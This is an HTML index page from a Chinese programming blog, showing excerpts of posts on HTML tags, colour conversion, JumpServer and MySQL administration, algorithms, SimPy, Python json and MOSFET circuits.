<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e88c43acfd3031137b97ea383981cf2/" rel="bookmark">
			HTML基本标签示例使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTML基本标签示例使用 1. 结构标签：html、head、title、meta、body2. 排版标签：p、br、hr3. 标题标签：h1、h2、h3、h4、h5、h64. 容器标签：div、span5. 列表标签：ul-li、ol-li、dl-dt-dd6. 图片标签：img7. 链接标签：a8. 表格标签：table-tr-th-td9. 文本标签：b、strong、big、small、em、i、sub、sup、ins、del 1. 结构标签：html、head、title、meta、body 根：&lt;html&gt; &lt;/html&gt;
头：&lt;head&gt; &lt;/head&gt;
标题：&lt;title&gt; &lt;/title&gt;（在头标签中）
元信息：&lt;meta charset="utf8"&gt;（在头标签中）
主体：&lt;body&gt; &lt;/body&gt;
color=“颜色”
bgcolor=“背景色”
background=“背景图路径”
颜色表示方式：① 颜色名称 red green ② RGB模式 #000000 #FFFFFF
2. 排版标签：p、br、hr 注释：&lt;!-- 注释文本 --&gt;
换行：&lt;br /&gt;
段落：&lt;p&gt; &lt;/p&gt; 自带换行，有行间距
水平线：&lt;hr /&gt;
hr 标签属性：
width=“宽度” 像素px / 百分比%
size=“高度” 水平线的粗细，避免过粗，一般个位数，eg：6px
color=“水平线颜色”
align=“对齐方式 left、center默认、right”
3. 标题标签：h1、h2、h3、h4、h5、h6 标题：
&lt;h1&gt;一级标题&lt;/h1&gt;
&lt;h2&gt;二级标题&lt;/h2&gt;
&lt;h3&gt;三级标题&lt;/h3&gt;
&lt;h4&gt;四级标题&lt;/h4&gt;
&lt;h5&gt;五级标题&lt;/h5&gt;
&lt;h6&gt;六级标题&lt;/h6&gt;
数字越小、字号越大、默认加粗、默认字号、默认占据一行、默认有行间距
4. 容器标签：div、span 块：&lt;div&gt; &lt;/div&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e88c43acfd3031137b97ea383981cf2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b37839b417054b5fd41f68a89a04fd8c/" rel="bookmark">
			rgba颜色和16进制颜色互相转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rgba颜色和16进制颜色互相转换 由于昨天搜关于这个的知识的时候被本站和网上的其他文章忽悠的走了好多弯路，所以特地来写一篇我的理解。
第一次写文章，排版不好，或者有错误请见谅。
16进制带alpha值颜色格式：#rrggbbaa
通过一个以“#”开头的6位十六进制数值表示一种颜色。6位数字分为3组，每组两位，依次表示红、绿、蓝三种颜色的强度。十六进制颜色码十六进制颜色码在RGB 颜色模式，颜色由表明红色，绿色，和蓝色各成分强度的三个数值表示。从极小值0到最大值255，当所有颜色,都在最低值被显示的颜色将是黑色，当所有颜色都在他们的最大值被显示的颜色将是白色。但是，一个缠扰不清的方面在RGB 颜色模式是，所有这些颜色可能代表以各种各样的方法。
–摘自百度百科-十六进制颜色码
蛋4，百科上并没有谈到任何和16进制有关的alpha值！！！
rgba格式：rgba(r,g,b,a)
RGBA的意思是（Red-Green-Blue-Alpha）它是在RGB上扩展包括了“alpha”通道，运行对颜色值设置透明度。
在RGBA中，四个数字以逗号分隔开，前面三个数字表示这个颜色的RGB值，这个设置和RGB并没有任何区别，最后面的数字代表透明度，范围在0-1之间。1表示不透明，在这里就相当于rgb(255,0,0),0表示全透明。
有时它也被写成ARGB（像RGBA一样，但是第一个数据是alpha），是Macromedia的产品使用的术语。比如，0x80FFFF00是50%透明的黄色，因为所有的参数都在0到255的范围内表示。0x80是128，大约是255的一半。
–摘自百度百科-RGBA
这部分就是导致我浪费了许多时间的罪魁祸首！！！虽然说可以这么做，但我的小程序中我这么写失败了（可能是我太菜了），所以最好还是把alpha值放后面吧。
两种颜色互相转换 例如rgba(0,191,255,128)也就是#00BFFF80
格式是 (r,ggg,bbb,aaa)也就是#rr gg bb aa
这种转换实际也是10进制和16进制互相转换
第一个 r:0&lt;=&gt;00
第二个 g:191/16=11…15
15/16=0…15
11&lt;=&gt;b
15&lt;=&gt;f
第三个 b:255/16=15
15/16=0…15
15&lt;=&gt;f
15&lt;=&gt;f
第四个 a:128/16=8
8/16=0…8
8&lt;=&gt;8
0&lt;=&gt;0
p.s 有些rgba格式的alpha好像是取0到1之间的数
所以：128/256=0.5
我表达能力太差了，先写到这里吧，再加一个
十六进制颜色透明度alpha值对照表 100% — FF
99% — FC
98% — FA
97% — F7
96% — F5
95% — F2
94% — F0
93% — ED
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b37839b417054b5fd41f68a89a04fd8c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c019ebd1f51baf6d91a9316caebb81d0/" rel="bookmark">
			jumpserver配置过程中遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近部署了一个jumpserver跳板机，按照官方给的文档结合自己服务器的使用情况，总算跌跌撞撞的成功搭建起来了，我是用的是centos7的系统部署的，服务器本身还跑了很多服务，这就涉及到端口占用及配置更改，一路遇到了不少的坑，现在我把我遇到的坑贴上来，给也有同样困惑的小伙伴一点参考吧！ 第一处：
配置邮件设置，这里遇到了点小问题，有不明白的小伙伴可以按照这个去配置就好了
注：SMTP的密码是qq开通smtp服务的时候给的授权码
第二处： 使用docker容器极速启动的koko服务，无限次重启，docker ps 查看容器状态一直为restarting
查看日志
docker logs jms_koko
提示 [ERRO] POST http://127.0.0.1:8080/api/v2/terminal/terminal-registrations/ failed, get code: 403, {"detail":"身份认证信息未提供。"}
这是因为 koko 里面的 BOOTSTRAP_TOKEN 与 jumpserver 的 BOOTSTRAP_TOKEN 不一样 查看jumpserver配置文件中的token
cat /opt/jumpserver/config.yml | grep BOOTSTRAP_TOKEN
将结果记录下来
docker stop jms_koko docker rm jms_koko
docker run --name jms_koko -d -p 2222:2222 -p 127.0.0.1:5000:5000 -e CORE_HOST=http://$Server_IP:8080 -e BOOTSTRAP_TOKEN=T6KIbSCwBrsIzjUd -e LOG_LEVEL=ERROR --restart=always jumpserver/jms_koko:1.5.7
docker ps -a
查看koko服务不再重启，好了
第三处：
jumpserver会话管理-终端管理没接到koko和gua注册
还是因为token的事儿，步骤跟上面一样
cat /opt/jumpserver/config.yml | grep BOOTSTRAP_TOKEN
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c019ebd1f51baf6d91a9316caebb81d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6775a98daef3a45f7420174931d1c862/" rel="bookmark">
			一招制敌的贪心算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 摘要区间问题最大不相交区间数区间覆盖问题 Huffman树 摘要 本文主要介绍贪心算法。 贪心算法并不是一种特定的算法，而是一种策略，一种一招制敌的策略。每次都贪心选择最好的，就是贪心算法。 所以贪心算法往往效率高，代码短。常见的贪心问题：区间问题， Huffman树等。
区间问题 最大不相交区间数 例题： HDU 2037 今年暑假不AC
题目大意就是给出n个节目，n个节目起止时间不同，要求选出最多的没有时间冲突的节目。
这道题是一道经典的贪心问题。本质上就是求出最大不相交区间数。对于本题，区间端点可以相交。
做法：对所有节目按结束时间从小到大排序。然后枚举每个区间是否和前一个区间有相交。如果没有，节目数就加一。
C++代码：
#include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; struct node{ int l, r; }arr[100005]; int cmp(node a, node b){ return a.r &lt; b.r; } int main(){ int n; while(cin&gt;&gt;n, n){ int l, r; for(int i = 0; i &lt; n; i++){ cin&gt;&gt;l&gt;&gt;r; arr[i].l = l; arr[i].r = r; } sort(arr, arr + n, cmp); int f = -2e9; int res = 0; for(int i = 0; i &lt; n; i++){ if(arr[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6775a98daef3a45f7420174931d1c862/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3095a3c931be3f6fc36d74faf687f897/" rel="bookmark">
			Simpy离散事件仿真（2）——基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SimPy是一个离散事件模拟库。活动组件（如车辆、顾客或消息）的行为由进程（Processes）进行建模。所有进程都存在于同个环境中。它们通过事件与环境相互作用。
进程由简单的Python生成器描述。您可以通过function或method调用它，这取决于它是一个普通函数还是一个类的方法。进程在生命周期中可以创造并挂起（yield）事件（Events），等待事件的触发。
当进程生成事件时，该进程将被挂起。当事件发生时（事件已触发），SimPy恢复进程。多个进程可以等待同一事件。SimPy按照生成事件的统一顺序进行恢复。
一个重要的事件类型是超时（Timeout）。此类事件在经过一定仿真时间后被触发。它们允许进程在给定的时间内睡眠（或保持其状态）。可以通过调用进程所在环境的适当方法（例如Environment.Timeout（））来创建超时事件和所有其他事件。
第一个进程 第一个案例是汽车行驶。这辆车将交替行驶和停车。当它开始行驶（或停车）时，打印当前仿真时间。
让我们开始吧：
import simpy def car(env): while True: print('Start parking at %d' % env.now) parking_duration = 5 yield env.timeout(parking_duration) print('Start driving at %d' % env.now) trip_duration = 2 yield env.timeout(trip_duration) 汽车的进程需要引用环境（env）来创建新的事件。汽车的行为被描述成一个无限循环。记住，这个函数是一个生成器。尽管它永远不会终止，但一旦到达yield语句，它会将控制流传回仿真程序。触发生成的事件后（“事件发生”），模拟将在此语句中恢复该函数。
正如我之前所说的，我们的车在停车和行驶之间切换。它通过打印消息和当前模拟时间（由Environment.now属性返回）来宣布其新状态。然后它调用Environment.timeout（）函数来创建超时事件。此事件描述停车（或行驶）的时间点。通过生成事件，它向仿真程序发出信号，表示它希望等待事件发生。
现在，汽车的行为已经建模，让我们创建一个它的实例并查看它的行为：
env = simpy.Environment() env.process(car(env)) &lt;Process(car) object at 0x7ff52d1f24e0&gt; env.run(until=15) Start parking at 0 Start driving at 5 Start parking at 7 Start driving at 12 Start parking at 14 我们需要做的第一件事是创建一个环境实例。这个实例被传递到我们的car进程函数中。调用它将创建一个进程生成器，该生成器需要启动并通过environment.process()添加到环境中。
请注意，此时，没有执行我们的进程函数的任何代码。它的执行是由仿真时间安排的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3095a3c931be3f6fc36d74faf687f897/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/722fd97697234993864b748a19036de9/" rel="bookmark">
			centos5.5安装ntfs-3g，并遇到mount failed: 设备或资源忙的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装ntfs-3g
下载fuse-2.7.4-8_12.el5.x86_64.rpm，fuse-ntfs-3g-2009.4.4-1.el5.rf.x86_64.rpm两个软件包
rpm -ivh fuse-2.7.4-8_12.el5.x86_64.rpm fuse-ntfs-3g-2009.4.4-1.el5.rf.x86_64.rpm
2、插入移动硬盘，fdisk -l查看移动硬盘的状态，发现
Disk /dev/sdm: 1000.2 GB, 1000204883968 bytes
255 heads, 63 sectors/track, 121601 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes
Device Boot Start End Blocks Id System
/dev/sdm1 * 1 121602 976760408 7 HPFS/NTFS
Disk /dev/dm-16: 1000.2 GB, 1000204883968 bytes
255 heads, 63 sectors/track, 121601 cylinders
Units = cylinders of 16065 * 512 = 8225280 bytes
Device Boot Start End Blocks Id System
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/722fd97697234993864b748a19036de9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc5bcd23073d99a14bf66bbdfdd4b866/" rel="bookmark">
			忘记mysql数据库连接密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本次操作所有需要用到的密令行：
bin&gt;net stop mysql
bin&gt;mysqld --skip-grant-tables
bin&gt;mysql
mysql&gt;use mysql
mysql&gt;update user set password=password("123456") where user="root";
mysql&gt;flush privileges;
mysql&gt;quit
bin&gt;mysqladmin -u root -p shutdown
bin&gt;net start mysql
下面具体操作
↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
1.进入 mysql 的 bin 目录下，打开 cmd ，关闭 mysql 数据库。
2.输入 mysqld --skip-grant-tables 回车。
（--skip-grant-tables 的意思是启动 MySQL 服务的时候跳过权限表认证）
注意：这时候，刚刚打开的 cmd 窗口已经不能使用了。重新再 bin 目录下打开一个新的 cmd 窗口进行下面的操作。
3.重新打开一个 cmd 窗口。输入 mysql 回车。下面是成功后的显示图。
4.连接权限数据库：use mysql
5.修改数据库连接密码：
update user set password=password("123456") where user="root";
注释：这里的“123456”为新密码，请根据自己的需求，输入新的密码。注意语句后面的“；”不能遗漏。
6.刷新权限（必须步骤）
flush privileges;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc5bcd23073d99a14bf66bbdfdd4b866/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6150775f6249bc78839d08b836361eb8/" rel="bookmark">
			C&#43;&#43; 一句代码打印当前线程ID
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		功能代码:
printf("ThreadID: %d\n", GetCurrentThreadId()); //经测试这个函数速度更快
printf("ThreadID: %d\n", (*(uint32_t*)&amp;std::this_thread::get_id());
我们要获取线程id，那么必然要用到get_id这个函数，那么我们看看这个函数返回的是什么。
看到了吗， _Thrd_id()其实是一个uint32_t类型的返回值，但是却被转换成了thread::id类型，
那么我们再来看看thread::id这个类里面有什么吧。
.看到了，里面就只有一个成员变量， 那就是类型为uint32_t的_Id， 那么我相信这时候大部分学过C++的同学都知道了吧， 那就是获取类成员地址在类中的偏移量 &amp;类实例+偏移量 = 我们想要的成员地址， 因为thread::id类只有一个成员变量， 那么偏移量就为0， 所以就直接通过&amp;std::this_thread::get_id()就拿到了我们想要的id类成员地址， 这时候再在前面加上*(uint32_t*)通过转指针解引用我们就拿到了想要的线程id, 是不是很简单？
本来之前在网上想看看别人怎么获取线程ID的， 结果一堆输入输出，强转… ，一行代码搞定的事非要
弄个三四行还要用上各种平时不怎么用的类这些， 然后自己看了下thread::id的代码，现在发上来。
另外推荐GetCurrentThreadId()这个函数 可以直接获取当前线程id
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/305a7af1520a414c95009320cdd272b0/" rel="bookmark">
			Ubuntu18.04问题——N: 无法安全地用该源进行更新，所以默认禁用该源。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题如下，可以试试我的解决办法
E: 仓库 “http://ppa.launchpad.net/mystic-mirage/pycharm/ubuntu bionic Release” 没有 Release 文件。
N: 无法安全地用该源进行更新，所以默认禁用该源。
N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
网上的各种办法我几乎都试过也没有解决（如换源、修改sources.list文件、修改签名等等）
我的办法如下：
打开软件软件和更新（不是换源），
然后点击其它软件
里边有一个网址与你报错的网址一样，而且是勾选状态的
取消选择，然后关闭
回到终端再执行命令就成功了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5976a8c0b5a48d05433b5ec92af4572c/" rel="bookmark">
			【图论】什么是欧拉图？如何求欧拉路径？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图论中有这么一类问题，涉及到欧拉图、欧拉路径（一笔画问题）、欧拉回路。本文给出其（不严谨的）定义，一些结论，最后给出了Hierholzer 算法以及对应的例题和答案。
（不严谨的）定义 对于一个连通的图G，有
欧拉路径：一条路径，它能够不重复地遍历完所有的边。这个性质很像不重复地一笔画完所有边，所以有些涉及到欧拉路径的问题叫做一笔画问题。欧拉回路：一条路径，它能够不重复地遍历完所有的边，并且回到起点。可以看出欧拉回路也是欧拉路径。半欧拉图：一个图，图中存在欧拉路径。欧拉图：一个图，图中存在欧拉回路。可以看出欧拉图也是半欧拉图。 图与欧拉路径、欧拉回路的结论 连通的无向图为（半）欧拉图的条件：
若所有顶点的度为偶数，则能够找到从任意顶点出发的欧拉回路。反之也成立，即若能够找到从任意顶点出发的欧拉回路，则所有顶点的度为偶数。若有且仅有2个顶点的度数为奇数，则只能够找到欧拉路径（路径从这两点中的任一顶点出发，到另一顶点结束）。反之也成立。 连通的有向图为（半）欧拉图的条件：
若所有顶点的入度等于出度，则能够找到从任意顶点出发的欧拉回路。反之也成立。若有且仅有两个顶点入度不等于出度，其中一个顶点入度比出度大1，记为 V 1 V_1 V1​，另一个顶点入度比出度小1，记为 V 2 V_2 V2​，则只能够找到欧拉路径（路径从顶点 V 2 V_2 V2​出发，到顶点 V 1 V_1 V1​结束）。反之也成立。 连通的混合图为（半）欧拉图的条件：（混合图是指既有有向边又有无向边的图。）
找到一个给每条无向的边定向的策略，使得每个顶点的入度等于出度，这样就能转换成有向图的情况。（这个有待考究） Hierholzer 算法 问题简述：给定一个（半）欧拉图，求欧拉路径。
Hierholzer 算法思想：当给定的图一定有欧拉路径（回路）时，从一个合理的起始点出发（后面会说什么是合理的），深度优先遍历整个图，遍历过的顶点都不得再遍历，直到遇到的第一个没有可遍历的邻居的顶点，这个顶点一点是某条欧拉路径的终点，把这个顶点“删掉”（实际上不用删，通过标记边已访问就可以不再访问它）后，下一次遇到的没有可遍历的邻居的顶点，一定是这条欧拉路径倒数第二个顶点，再把这个顶点“删掉”再遍历，以此类推，直到把所有没有可遍历的邻居的顶点找到，我们就找到了这条欧拉路径上的所有顶点。:
问题1：可能有人会奇怪，Hierholzer 算法为什么一定能得到欧拉路径？为什么每遇到没有可遍历的邻居的顶点就是欧拉路径上的一个终点？下面以有向图作为说明，无向图同理。这个其实涉及到一个顶点的出度和入度问题。
若从某个顶点开始遍历，遍历过的边不能在遍历，直到无边可遍历为止，当遇到另一个出度等于入度顶点 V V V时，是不可能停留在 V V V的，因为 V V V出度等于入度，你进入多少次，一定有对应的出边让你出去多少次。
因此第一个遇到的没有可遍历的邻居的顶点只有两种，一种是它的入度比出度大一，另一种是它的入度与出度相等，但是它是起点（也就是说既是起点又是终点，饶了一圈）。根据前面所说的一些结论（图与欧拉路径、欧拉回路的结论），这两种点都是某条欧拉路径上的终点，所以当我们遇到的没有可遍历的邻居的顶点，尽管放心大胆的把该顶点记录下来，因为它一定是欧拉路径的终点。
问题2：可能还有人会奇怪，为什么遇到的第二个没有可遍历的邻居的顶点是欧拉路径倒数第二个点？我们可以想象一下，我把第一个没有可遍历的邻居的顶点以及对应的边“删掉”后（实际也可以不删，只需标记已经访问过就行），它相邻顶点的出度和入度就会发生变化，在草稿纸画一下你就会发现，它周围的顶点要么变成出度等于入度的顶点，要么变成入度比出度大1的顶点，他们都符合成为欧拉路径的终点的条件，并且由于我们是递归地深度优先遍历，递归返回上一层后，一定是在这些相邻顶点之中，所以这时候遇到的第二个没有可遍历的邻居的顶点，一定是欧拉路径倒数第二个点。
Hierholzer 算法过程：
选择一个合理的点作为起始点，遍历所有相邻边。（一会说什么是合理的点）深度优先搜索，访问相邻顶点。将经过的边都不能再访问。如果当前顶点没有相邻边，则将顶点入数组末尾。最后将数组倒序输出，就是从起点出发的欧拉回路。 Hierholzer 算法作用：个人觉得，Hierholzer 算法就是证明了，当给定的图一定有欧拉路径（回路）时，按照Hierholzer 算法无脑深度优先搜索，就一定会得到欧拉路径（回路）的逆序。至于得到的是欧拉路径还是欧拉环路，取决于你的图是欧拉图还是半欧拉图，若图为欧拉图，得到的是欧拉环路，若图是半欧拉图，得到的则是欧拉路径。Hierholzer 算法为什么一定能得到欧拉路径？它的原理是什么？请看这里。
注意： 若图不是欧拉图也不是半欧拉图，采用Hierholzer 算法得到的结果必定错误。所以在贸然采用Hierholzer 算法前，我们需要先按照前面说的图与欧拉路径、欧拉回路的结论判断图到底是不是（半）欧拉图，若是，才能用该算法去找欧拉路径（回路）。
什么是合理的起始点：上面说到选择合理的点作为起始点，那么什么点是合理的？这里需要回顾一下前面说的图与欧拉路径、欧拉回路的关系，以无向图为例（有向图同理）：
当图为欧拉图时，能够找到从任意点出发的欧拉回路，此时从任一点出发，都能找到欧拉回路，因此任何一点都是合理的；当图为半欧拉图时，有且仅有2个顶点的度数为奇数，只能够找到欧拉路径（路径从这两点中的任一点出发，到另一点结束），此时只有从这两点之一出发，才能找到欧拉路径，因此只有这两点是合理的。 例题：为了掌握Hierholzer 算法，这里给出一道例题【leetcode】332. 重新安排行程
例题答案(C++)：
// 思路： // Hierholzer算法。个人觉得Hierholzer算法就是证明了一点：当存在欧拉路径时，从合理的起始点无脑dfs遍历，得到的路径一定是欧拉路径。 // 因为题目规定了一定有欧拉路径，并且起点一定是JFK（所以这个起始点一定是合理的），所以根据Hierholzer算法，可以无脑dfs。 class Solution { public: // 这里用map，内部自动按照string升序排列了，所以先找到的一定是自然排序最小的路径 typedef unordered_map&lt;string, map&lt;string, int&gt;&gt; adjacent; vector&lt;string&gt; min_path; bool dfs(adjacent &amp;adj, string airport){ // 无脑dfs遍历邻居，同时遍历过的边标记已遍历 for(auto &amp;[next, number] : adj[airport]){ if(0 &gt;= number) continue; --number; dfs(adj, next); } // 终点是没有相邻边的点 // 当删除终点后，终点前的点也没有相邻边了，变成新的终点 // 运行到这里，当前airport一定没有可遍历的相邻边了，则它是此时的终点 min_path.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5976a8c0b5a48d05433b5ec92af4572c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/726b343edc5a92d31f210f13b11c0890/" rel="bookmark">
			JSON常见用法:json.load()、json.loads()、json.dump()、json.dumps()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JSON的定义
JSON 指的是 JavaScript 对象表示法（JavaScript Object Notation）
JSON 是轻量级的文本数据交换格式
JSON 独立于语言
JSON 具有自我描述性，更易理解
常用的方法
json.load()从json文件中读取数据
json.loads()将str类型的数据转换为dict类型
json.dumps()将dict类型的数据转成str
json.dump()将数据以json的数据类型写入文件中
代码示例：
json.load()从json文件中读取数据 with open('text.json','r',encoding='utf-8') as f : print(json.load(f)) 运行结果：
{'user_id': '66', 'movie_id': '357', 'rating': '5', 'time': '2009'} json.loads()将str类型的数据转换为dict类型 import json name_emb = {'user_id': '66', 'movie_id': '357', 'rating': '5', 'time': '2009'} jsDumps = json.dumps(name_emb) jsLoads = json.loads(jsDumps) print(name_emb) print(jsDumps) print(jsLoads) print(type(name_emb)) print(type(jsDumps)) print(type(jsLoads)) 运行结果：
{'user_id': '66', 'movie_id': '357', 'rating': '5', 'time': '2009'} {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/726b343edc5a92d31f210f13b11c0890/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98e7925ff56113e17f2ed411047c50b2/" rel="bookmark">
			101 从一个错误开始讲场效应管的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
写作思路调整下，前期科普的较多，现在开始，讲解最实用的设计思路和用法。还是坚持从整体到局部，从大框架到小应用。
近期几位同学给我提了建议和意见。主要有以下几个：
1、要参加大学竞赛和实验室，无法快速的用上，对基础电路很模糊；
2、马上面临毕业了，找什么样的工作，怎样实习那些岗位适合后续发展。
3、讲的二极管法，当只有一个板子时，不知道怎么使用。
4、知乎专栏的排版很乱，建议用哔哩哔哩:)
解决方案如下：
1、这个马上就开始转变写作方式，采用模块化的电路方式讲解，全部是整体很难快速应用，但是模块化，也就是一个元件作为主要元件，搭建实用的电路，这样既学会了一种电路，又了解了基本电子元件，尝试这种写法。完整的拿一个电路板讲解，前期也做了大量的尝试，只是让大家掌握一种学习技巧，真实的电子工程师、嵌入式工程师，还要对一系列的基本电路了解，其实并不像想象的那样多，我们作为应用工程师，实际上来回就是几种典型电路，不需要把所有的电路都学会，而是要把典型的、常用的、立刻能够应用的实现和理解。
2、只能针对我所擅长的几个领域提供一些建议，不一定正确，即使我说的有点偏了，但是年轻人走一两年弯路也是值得的，另外相信，就专业领域来说，总不至于太偏，后续章节会提供一些思路和技巧，让临近毕业的同学大体有个方向，但是这个一定是分条件的，首先限定人员：家里条件一般，家庭无法提供支援，毫无头绪，那么将我的建议作为参考。如果有亲戚朋友有更好的路子，那么就不要听我的，另外一般你至少有一到两年的试错时间（实际上，有些人哪怕走了很多年弯路，一朝得道，立刻飞速提升），人生经历不是一成不变的，其实经过一定努力和引导，可以跨行业、跨专业成长。所以即使开始选择错了，也不必气馁，总有向上的路走的。
下面是电子工程师需要了解的最基本研发流程，在这个过程中，实际上都有涉及到自己的一部分工作，所以工作不是单一的，而是系统性的，也就是你要学会几种常用的软硬件工具，这样才能站稳脚跟。
很多时候两个人的差异就是在于一两个工具，而不是智力，很多智力超群的，因为对一件东西不感兴趣，也懒得去学某种必须要会的工具，与一个好工作就会失之交臂，这就是机会给有准备的人。从今天开始你就要学会一件事，去了解某个行业、某个职位，所在位置上的人他会什么工具，你就要去学会它，哪怕仅仅是入门，你就能超过90%的人，机会就是你的。而不是只是在脑子里考虑，今天要努力了，明天要加油了，这是假努力，毫无用处，立刻退而结网，例如电子前面我们已经展开讲了，先学会两个工具Altium和proteus，几位同学开始了？？是不是只是浏览了下没有实际动手试试？ 问几个问题： 1）下载proteus了吗？安装了吗？ 2）它的例程打开看了吗？ 3）实际动手画一两个电路了吗？ 4）上网搜搜它的教程了吗？ 5）看看它的视频教程了吗？ 不知道你做到了几点，我猜大部分人，第一步都没有做，而是仅仅在空想。 不要给自己找理由，你的家庭条件允许吗？ 不要给自己找理由，你曾经的理想呢？ 不要给自己找理由，你有要负责的人吗？ 不要给自己找理由，你是不是该行动了？
是我没有给你罗列学习步骤吗？是我说的不够详细吗？怕是都不是， 一个字：懒，两个字：很懒。 一句话，大部分人无法超越自己，实际上是思想的巨人，行动的矮子。 智力不是问题，现在网上资料大把，就看你做了什么，学了什么。 有句话，现在社会傻子太多，骗子不够用。 有些商业软件就是要把你训练成不懂脑子的机器人，把你的精力、时间都抢走，然后一茬茬的割韭菜。该醒醒了，计算下，你一天的时间都是浪费在哪里了？
3、没有万能的招数，任何东西都需要一个基础，不可能你一点电路知识也不学习就能行，就如人要走路，第一步你得先站起来，所以有些最基本的知识要学的，但是不是想象中要完全理解，而是带着疑问去实践，也有捷径和方法快速学习，我们这个专栏的目标是加快大家的学习速度，而不是大家躺着就起飞了。针对这个问题，专栏会加快更新，让大家快速掌握一些基本知识。
4、知乎没有目录功能，所以我建立了一个置顶文章，建了个基本目录，哔哩哔哩没去过，所以实在不懂怎么玩，不过我会去学习学习，另外开始就是写的比较乱，就写文章来说，我也是新手，编排还是很初级，正在学习和调整。
从101节的意思，是转换思路，形成第三套文章，主要快速从模块和实用电路学起，可以立即学以致用。
针对模块电路会从几个主要的方面讲解：
1、电路原理
2、仿真测试
3、采用的元件特性，每种元件通常的用法
4、怎样排查故障和问题
5、生产加工要注意的工艺问题
6、其他常规应用
7、包装要求、封装规格 等等
这样让大家从研发设计角度、生产加工工艺角度、维修检测角度、其他常规应用等方面都有一个认知，加快学习进度。
101.1 设计了个LED只能开，不能关的控制电路。 用单片机的一个引脚控制一个发光二极管发光。 我们先看下用啦哪几种元件：
注意：其中二极管和电阻我贴上的图有贴片元件也有直插元件，现在更常用的是贴片元件。
注意AO3407 （Q1）这个元件就是场效应管（MOSFET），它应该是最常用的开关元件了。 记得场效应管主要就是开关的作用。
它有几个特性：
1、开关速度快；
2、体积可以做的很小的情况下，过大电流（因为当它导通时，内部电阻很小）；
3、很微小的电流就能控制它打开关闭。但是施加电压要够。
4、它是静电敏感的器件，所以最好不要用手直接接触，容易损坏，使用过程中要做好防静电措施。
